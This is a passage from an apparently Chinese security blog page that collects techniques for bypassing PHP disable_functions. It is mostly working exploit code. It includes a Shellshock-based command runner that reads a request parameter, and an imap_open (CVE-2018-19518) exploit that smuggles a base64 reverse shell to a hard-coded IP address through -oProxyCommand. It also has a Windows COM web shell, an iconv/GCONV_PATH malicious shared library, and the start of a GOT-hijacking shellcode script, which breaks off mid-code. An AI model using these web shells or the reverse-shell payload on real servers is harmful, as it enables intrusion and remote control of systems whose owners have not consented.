class="hljs-string">&quot;bash&quot;</span>)!=<span class="hljs-literal">FALSE</span>)&#123;<br>      <span class="hljs-variable">$tmp</span>=<span class="hljs-title function_ invoke__">tempnam</span>(<span class="hljs-title function_ invoke__">sys_get_temp_dir</span>(), <span class="hljs-string">&#x27;as&#x27;</span>);<br>      <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="hljs-subst">$c</span> &gt;<span class="hljs-subst">$tmp</span> 2&gt;&amp;1&quot;</span>);<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;error_log&#x27;</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">1</span>);<br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;a@127.0.0.1&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-bv&quot;</span>);<br>      &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Not vuln (not bash)\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$output</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp</span>);<br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$tmp</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$output</span>!=<span class="hljs-string">&quot;&quot;</span>)&#123;<br>      <span class="hljs-keyword">print</span>(<span class="hljs-variable">$output</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;No output, or not vuln.&quot;</span>);<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;不满足使用条件&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// runcmd(&quot;whoami&quot;); // 要执行的命令</span><br><span class="hljs-title function_ invoke__">runcmd</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-comment">// ?cmd=whoami</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="imap-open-绕过-CVE-2018-19518"><a href="#imap-open-绕过-CVE-2018-19518" class="headerlink" title="imap_open()绕过 (CVE-2018-19518)"></a>imap_open()绕过 (CVE-2018-19518)</h1><p><strong>利用条件</strong></p><ul><li>PHP 安装 imap 模块</li></ul><p><strong>原理</strong></p><p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）</p><p>ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。<br>即使是ssh连接失败了，但是命令还是能执行。</p><p><strong>利用</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/47.99.77.52/8888 0&gt;&amp;1&quot;</span>;<br><span class="hljs-variable">$base64</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$payload</span>);<br><span class="hljs-variable">$server</span> = <span class="hljs-string">&quot;any -oProxyCommand=echo\t<span class="hljs-subst">&#123;$base64&#125;</span>|base64\t-d|bash&quot;</span>;<br>@<span class="hljs-title function_ invoke__">imap_open</span>(<span class="hljs-string">&quot;&#123;&quot;</span>.<span class="hljs-variable">$server</span>.<span class="hljs-string">&quot;&#125;:143/imap&#125;INBOX&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;\n\nError: &quot;</span>.<span class="hljs-title function_ invoke__">imap_last_error</span>());;<br></code></pre></td></tr></table></figure><h1 id="Windows组件COM绕过"><a href="#Windows组件COM绕过" class="headerlink" title="Windows组件COM绕过"></a>Windows组件COM绕过</h1><p><strong>利用条件</strong></p><ul><li>com.allow_dcom &#x3D; true</li><li>extension&#x3D;php_com_dotnet.dll</li><li>php&gt;5.4</li><li>目标服务器为Windows系统</li></ul><p><strong>利用</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wsh&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wsh&#x27;</span>] : <span class="hljs-string">&#x27;wscript&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$wsh</span> == <span class="hljs-string">&#x27;wscript&#x27;</span>) &#123;<br>    <span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$wshit</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Create Wscript.Shell Failed!&quot;</span>);<br>    <span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wshit</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd /c&quot;</span>.<span class="hljs-variable">$command</span>);<br>    <span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();<br>    <span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$wsh</span> == <span class="hljs-string">&#x27;application&#x27;</span>) &#123;<br>    <span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$wshit</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Shell.Application Failed!&quot;</span>);<br>    <span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wshit</span>-&gt;<span class="hljs-title function_ invoke__">ShellExecute</span>(<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/c &quot;</span>.<span class="hljs-variable">$command</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h1><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>putenv</li><li>iconv</li><li>存在可写的目录, 需要上传 .so 文件</li></ul><p><strong>原理</strong></p><p>php在执行iconv函数时，实际上是调用glibc中的iconv相关函数，其中一个很重要的函数叫做iconv_open()</p><p>php的iconv函数的第一个参数是字符集的名字，这个参数也会传递到glibc的iconv_open函数的参数中</p><p>iconv_open函数的执行过程：<br>1：iconv_open函数首先会找到系统提供的gconv-modules文件，查看各个字符集的.so文件所在位置<br>2：然后再根据gconv-modules文件的指示去链接参数对应的.so文件<br>3：之后会调用.so文件中的gconv()与gonv_init()函数</p><p>使用的时候在编码转换时指定设置好的xxx编码，就会去调用指定的so文件了</p><p><strong>利用</strong></p><p>gconv-modules</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">module  PAYLOAD<span class="hljs-regexp">//</span>    INTERNAL    ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>tmp/payload    <span class="hljs-number">2</span><br>module  INTERNAL    PAYLOAD<span class="hljs-regexp">//</span>    ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>tmp/payload    <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>payload.c</p><p><code>gcc payload.c -o payload.so -shared -fPIC</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gconv</span><span class="hljs-params">()</span> &#123;&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gconv_init</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pwned&quot;</span>);<br>  system(<span class="hljs-string">&quot;ls / &gt; /tmp/1.txt&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;GCONV_PATH=/tmp/&quot;</span>);<br>    <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;payload&quot;</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>, <span class="hljs-string">&quot;whatever&quot;</span>);<br><br>    <span class="hljs-comment">// 其他调用了iconv_open()的函数也可以触发rce</span><br>    <span class="hljs-comment">// iconv_strlen(&quot;1&quot;,&quot;payload&quot;);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>linux系统提供了一个环境变量：GCONV_PATH，该环境变量能够使glibc使用用户自定义的gconv-modules文件</p></blockquote><p>将 gconv-modules 和编译好的 payload.so 传入tmp后执行1.php即可</p><h1 id="写shellcode劫持got表"><a href="#写shellcode劫持got表" class="headerlink" title="写shellcode劫持got表"></a>写shellcode劫持got表</h1><p><a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">深入了解GOT,PLT和动态链接</a></p><p>劫持got表的思路</p><ul><li>读 &#x2F;proc&#x2F;self&#x2F;maps 和 &#x2F;proc&#x2F;self&#x2F;exe ，分别找到程序基地址，栈地址，libc地址和利用函数(open)的got表地址</li><li>写 &#x2F;proc&#x2F;self&#x2F;mem ，修改利用函数(open)的got表地址为存放shellcode的地址</li><li>构造shellcode并写入</li><li>通过例如readfile等可以调用open函数的函数来触发shellcode</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/***</span><br><span class="hljs-comment">https://xz.aliyun.com/t/7990</span><br><span class="hljs-comment">https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485666&amp;idx=1&amp;sn=71a0cce05637edd488cb9cccb3967504</span><br><span class="hljs-comment">***/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">section tables type</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_NULL&#x27;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_PROGBITS&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_SYMTAB&#x27;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_STRTAB&#x27;</span>,<span class="hljs-number">3</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_RELA&#x27;</span>,<span class="hljs-number">4</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_HASH&#x27;</span>,<span class="hljs-number">5</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_DYNAMIC&#x27;</span>,<span class="hljs-number">6</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_NOTE&#x27;</span>,<span class="hljs-number">7</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_NOBITS&#x27;</span>,<span class="hljs-number">8</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_REL&#x27;</span>,<span class="hljs-number">9</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_SHLIB&#x27;</span>,<span class="hljs-number">10</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_DNYSYM&#x27;</span>,<span class="hljs-number">11</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_INIT_ARRAY&#x27;</span>,<span class="hljs-number">14</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_FINI_ARRAY&#x27;</span>,<span class="hljs-number">15</span>);<br><span class="hljs-comment">//why does section tables have so many fuck type</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_GNU_HASH&#x27;</span>,<span class="hljs-number">0x6ffffff6</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_GNU_versym&#x27;</span>,<span class="hljs-number">0x6fffffff</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_GNU_verneed&#x27;</span>,<span class="hljs-number">0x6ffffffe</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">elf</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$elf_bin</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$strtab_section</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$rel_plt_section</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$dynsym_section</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shared_librarys</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rel_plts</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getElfBin</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;elf_bin;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setElfBin</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;elf_bin = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$elf_bin</span>,<span class="hljs-string">&quot;rb&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unp</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$value</span>)));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$start</span>,<span class="hljs-variable">$len</span></span>)</span>&#123;<br><br>        <span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$this</span>-&gt;elf_bin,<span class="hljs-variable">$start</span>);<br>        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">fread</span> (<span class="hljs-variable">$this</span>-&gt;elf_bin,<span class="hljs-variable">$len</span>);<br>        <span class="hljs-title function_ invoke__">rewind</span>(<span class="hljs-variable">$this</span>-&gt;elf_bin);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">unp</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_section</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span>=<span class="hljs-string">&quot;&quot;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$elf_bin</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setElfBin</span>(<span class="hljs-variable">$elf_bin</span>);<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;elf_shoff=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x28</span>,<span class="hljs-number">8</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;elf_shentsize=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-number">2</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;elf_shnum=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3c</span>,<span class="hljs-number">2</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;elf_shstrndx=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3e</span>,<span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable language_">$this</span>-&gt;elf_shnum;<span class="hljs-variable">$i</span>+=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-variable">$sh_type</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">4</span>,<span class="hljs-number">4</span>);<br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$sh_type</span>)&#123;<br>                <span class="hljs-keyword">case</span> SHT_STRTAB:<br>                    <span class="hljs-variable language_">$this</span>-&gt;strtab_section[<span class="hljs-variable">$i</span>]=<br>                        <span class="hljs-keyword">array</span>(<br>                            <span class="hljs-string">&#x27;strtab_offset&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),<br>                            <span class="hljs-string">&#x27;strtab_size&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>)<br>                        );<br>                    <span class="hljs-keyword">break</span>;<br><br>                <span class="hljs-keyword">case</span> SHT_RELA:<br>                    <span class="hljs-variable language_">$this</span>-&gt;rel_plt_section[<span class="hljs-variable">$i</span>]=<br>                        <span class="hljs-keyword">array</span>(<br>                            <span class="hljs-string">&#x27;rel_plt_offset&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),<br>                            <span class="hljs-string">&#x27;rel_plt_size&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>),<br>                            <span class="hljs-string">&#x27;rel_plt_entsize&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">56</span>,<span class="hljs-number">8</span>)<br>                        );<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> SHT_DNYSYM:<br>                    <span class="hljs-variable language_">$this</span>-&gt;dynsym_section[<span class="hljs-variable">$i</span>]=<br>                        <span class="hljs-keyword">array</span>(<br>                            <span class="hljs-string">&#x27;dynsym_offset&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),<br>                            <span class="hljs-string">&#x27;dynsym_size&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>),<br>                            <span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">56</span>,<span class="hljs-number">8</span>)<br>                        );<br>                    <span class="hljs-keyword">break</span>;<br><br>                <span class="hljs-keyword">case</span> SHT_NULL:<br>                <span class="hljs-keyword">case</span> SHT_PROGBITS:<br>                <span class="hljs-keyword">case</span> SHT_DYNAMIC:<br>                <span class="hljs-keyword">case</span> SHT_SYMTAB:<br>                <span class="hljs-keyword">case</span> SHT_NOBITS:<br>                <span class="hljs-keyword">case</span> SHT_NOTE:<br>                <span class="hljs-keyword">case</span> SHT_FINI_ARRAY:<br>                <span class="hljs-keyword">case</span> SHT_INIT_ARRAY:<br>                <span class="hljs-keyword">case</span> SHT_GNU_versym:<br>                <span 